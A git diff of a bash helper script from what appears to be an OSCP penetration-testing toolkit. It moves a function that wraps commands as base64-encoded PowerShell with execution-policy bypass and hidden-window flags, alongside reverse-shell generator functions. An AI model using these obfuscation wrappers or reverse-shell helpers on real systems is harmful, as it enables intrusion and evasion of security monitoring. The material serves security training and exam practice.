@@ -4,7 +4,8 @@ SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
 source $SCRIPTDIR/general.sh
 # shellcheck source=~/oscp/scripts/common/network.sh
 source $SCRIPTDIR/network.sh
-
+# shellcheck source=~/oscp/scripts/common/encoding_utils.sh
+source $SCRIPTDIR/encoding_utils.sh
 
 prepare_generic_linux_shell() {
     if [ -z "$host_port" ]; then
@@ -154,31 +155,6 @@ get_ruby_reverse_shell() {
         reverse_shell="ruby -e '$reverse_shell'"
     fi
     echo "$reverse_shell"
-}
-
-encode_powershell() {
-    if [ -z "$1" ]; then
-        echo "Usage: powershell_base64 <string>"
-        return 1
-    fi
-    local input_string="$1"
-    if [[ "$input_string" == "powershell"* ]]; then
-        # Assume already encoded
-        echo "$input_string"
-        return 0
-    fi
-    local encoded_string=""
-    encoded_string=$(echo "$input_string" | iconv -t UTF-16LE | base64 | tr -d '\n')
-    if [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "simple" ]]; then
-        echo "powershell -ec $encoded_string"
-    elif [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "short" ]]; then
-        echo "$encoded_string"
-    elif [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "long" ]]; then
-        encoded_string=$(echo "$input_string" | base64 | tr -d '\n')
-        echo "powershell -Command \"\$Bytes=[System.Convert]::FromBase64String('$encoded_string');\$DecodedCommand=[System.Text.Encoding]::UTF8.GetString(\$Bytes);Invoke-Expression \$DecodedCommand\""
-    else
-        echo "powershell -ep bypass -w hidden -nop -nol -noni -ec $encoded_string"
-    fi
 }
 
 prepare_generic_windows_shell() {
